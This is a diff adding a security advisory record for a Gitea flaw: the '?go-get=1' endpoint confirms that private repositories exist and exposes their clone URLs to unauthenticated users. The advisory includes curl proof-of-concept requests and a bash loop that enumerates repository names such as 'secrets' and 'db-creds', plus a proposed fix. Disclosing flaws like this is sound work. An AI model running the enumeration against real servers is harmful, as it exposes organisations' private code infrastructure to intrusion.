@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-p4mj-98mv-xq26",
+  "modified": "2026-07-21T20:30:32.937473876Z",
+  "published": "2026-07-21T20:23:48Z",
+  "aliases": [
+    "CVE-2026-58507"
+  ],
+  "summary": "Gitea: Private Repository Existence Disclosure via go-get Meta Endpoint",
+  "details": "| Field | Value |\n|-------|-------|\n| **Affected File** | `routers/web/repo/githttp.go`, `services/context/repo.go` |\n| **Affected Functions** | `httpBase()`, `EarlyResponseForGoGetMeta()` |\n| **Affected Lines** | `githttp.go:63–66`, `services/context/repo.go:374–396` |\n| **Prerequisite** | None — fully unauthenticated |\n\n---\n\n#### Description\n\nGitea implements a special behavior for requests containing the `?go-get=1` query parameter. This parameter is sent by the Go toolchain (`go get`, `go install`) to discover VCS metadata for module imports. When Gitea detects this parameter in the HTTP request path for a repository, it bypasses the normal authentication and authorization stack and returns an HTTP 200 response containing `\u003cmeta name=\"go-import\"\u003e` and `\u003cmeta name=\"go-source\"\u003e` tags — regardless of whether:\n\n- The repository is private\n- The requesting user is authenticated\n- The requesting user has any permission on the repository\n\nThe entry point is `routers/web/repo/githttp.go:63–66`:\n\n```go\nfunc httpBase(ctx *context.Context, optGitService ...string) *serviceHandler {\n    reponame := strings.TrimSuffix(ctx.PathParam(\"reponame\"), \".git\")\n\n    if ctx.FormString(\"go-get\") == \"1\" {\n        context.EarlyResponseForGoGetMeta(ctx)\n        return nil   // ← returns before any auth or permission check\n    }\n    ...\n```\n\nThe `EarlyResponseForGoGetMeta` function (`services/context/repo.go:379–396`) is called unconditionally, and the function's own docstring documents the intended behavior:\n\n```go\n// EarlyResponseForGoGetMeta responses appropriate go-get meta with status 200\n// if user does not have actual access to the requested repository,\n// or the owner or repository does not exist at all.\n// This is particular a workaround for \"go get\" command which does not respect\n// .netrc file.\nfunc EarlyResponseForGoGetMeta(ctx *Context) {\n    username := ctx.PathParam(\"username\")\n    reponame := strings.TrimSuffix(ctx.PathParam(\"reponame\"), \".git\")\n    ...\n    ctx.PlainText(http.StatusOK, htmlMeta)   // ← HTTP 200, no auth check\n}\n```\n\nThe function also appears at `services/context/repo.go:444, 516, 571` — all repository-scoped route handlers that check `?go-get=1` and call `EarlyResponseForGoGetMeta` before performing any permission verification.\n\nThe metadata returned includes:\n\n1. The **full repository name** and owner — confirming the repository exists\n2. The **HTTP clone URL** — a fully-formed URL pointing to the repository\n3. The **source browsing URL templates** — which may reveal the default branch name\n\nThis allows an unauthenticated attacker to:\n\n1. **Confirm existence** of any private repository by name\n2. **Enumerate** private repository names through brute-force without triggering authentication failures\n3. **Harvest** clone URLs and default branch names of private repositories\n\n---\n\n#### Proof of Concept\n\n**Step 1 — Identify a private repository**\n\nAny private repository works. For this demonstration, `admin/classified-internal` is set to private:\n\n---\n\n**Step 2 — Confirm access is denied without authentication**\n\nStandard requests to a private repository correctly return 404 for unauthenticated users.\n\n---\n\n**Step 3 — Bypass using go-get parameter**\n\n```bash\ncurl -s \"http://localhost:3000/admin/classified-internal?go-get=1\"\n```\n\n**Actual response (HTTP 200):**\n\n```html\n\u003c!doctype html\u003e\n\u003chtml\u003e\n    \u003chead\u003e\n        \u003cmeta name=\"go-import\"\n              content=\"localhost:3000/admin/classified-internal\n                       git\n                       http://localhost:3000/admin/classified-internal.git\"\u003e\n        \u003cmeta name=\"go-source\"\n              content=\"localhost:3000/admin/classified-internal\n                       _\n                       http://localhost:3000/admin/classified-internal/src/branch/main{/dir}\n                       http://localhost:3000/admin/classified-internal/src/branch/main{/dir}/{file}#L{line}\"\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n        go get --insecure localhost:3000/admin/classified-internal\n    \u003c/body\u003e\n\u003c/html\u003e\n```\n\nThe response:\n- Returns HTTP **200** (not 404) — confirming the repository **exists**\n- Reveals the **full clone URL**: `http://localhost:3000/admin/classified-internal.git`\n- Reveals the **default branch name**: `main`\n- Reveals the **owner username**: `admin`\n\nThis same response is returned whether or not the repository exists — the comment in `EarlyResponseForGoGetMeta` states it responds identically for both — however in practice, the clone URL generated will be functionally different (a real clone attempt against a non-existent repo fails, while one against a private repo fails only at authentication). An attacker can differentiate using response timing or by attempting `git ls-remote`.\n\n---\n\n**Step 4 — Enumerate private repositories at scale**\n\n```bash\n# Enumerate private repos by guessing common names\nfor name in internal deploy secrets infra api-keys prod-config db-creds; do\n  response=$(curl -s \"http://localhost:3000/admin/${name}?go-get=1\")\n  if echo \"$response\" | grep -q \"go-import\"; then\n    clone_url=$(echo \"$response\" | grep -oP 'git http://\\K[^ \"]+')\n    echo \"[FOUND] admin/${name} → clone: http://${clone_url}\"\n  fi\ndone\n```\n\n---\n\n**Step 5 — Verify the same applies to the main web router**\n\nThe vulnerability also exists via the standard web router for repository pages:\n\n```bash\n# Works on any repo-scoped URL\ncurl -s \"http://localhost:3000/admin/classified-internal/releases?go-get=1\" | grep \"go-import\"\ncurl -s \"http://localhost:3000/admin/classified-internal/issues?go-get=1\"   | grep \"go-import\"\n```\n\nAll return HTTP 200 with the metadata.\n\n---\n\n#### Impact Analysis\n\n**Direct impact:**\n\n| What is leaked | Sensitivity |\n|----------------|-------------|\n| Repository exists | Confirms presence of private infrastructure code, internal tooling, unreleased products |\n| Owner / organization name | Reveals organizational structure |\n| Clone URL | Provides a direct endpoint for credential-stuffing attacks against git HTTP endpoint |\n| Default branch name | Reduces brute-force surface for subsequent attacks |\n\n---\n\n#### Root Cause Analysis\n\nThe bypass was introduced intentionally as a workaround for the Go toolchain's limitation of not reading `.netrc` credentials before deciding whether a module is accessible. The Go `go get` command probes the VCS endpoint without credentials first; if it gets a 404, it treats the module as non-existent and fails immediately without prompting for credentials.\n\nThe workaround — returning metadata unconditionally — was the path of least resistance for enabling private module imports. The unintended consequence is that it creates an unauthenticated information disclosure endpoint for every repository in the instance.\n\n---\n\n#### Recommended Fix\n\nThe fix requires differentiating between requests that carry authentication credentials and those that do not, before calling `EarlyResponseForGoGetMeta`.\n\n```go\n// routers/web/repo/githttp.go:63–66 — proposed fix\n\nif ctx.FormString(\"go-get\") == \"1\" {\n    // For public repos, always respond to support the go toolchain\n    if repo != nil \u0026\u0026 !repo.IsPrivate {\n        context.EarlyResponseForGoGetMeta(ctx)\n        return nil\n    }\n    // For private repos, only respond if the user is authenticated\n    // and has at least read access\n    if ctx.IsSigned {\n        if perm, err := access_model.GetDoerRepoPermission(ctx, repo, ctx.Doer); err == nil {\n            if perm.CanRead(unit.TypeCode) {\n                context.EarlyResponseForGoGetMeta(ctx)\n                return nil\n            }\n        }\n    }\n    // Unauthenticated request for a private repo — return 404 consistent\n    // with normal behavior; the go toolchain will prompt for credentials\n    ctx.PlainText(http.StatusNotFound, \"Repository not found\")\n    return nil\n}\n```\n\nThis approach preserves the go-get functionality for public repositories while protecting private ones. The Go toolchain will fall back to prompting for credentials when it receives a 404, which is the correct behavior for private module imports.\n\n---",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.gitea.io/gitea",
+        "purl": "pkg:golang/code.gitea.io/gitea"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.27.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-p4mj-98mv-xq26/GHSA-p4mj-98mv-xq26.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-p4mj-98mv-xq26"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-gitea/gitea"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/releases/tag/v1.27.0"
+    }
+  ]
+}
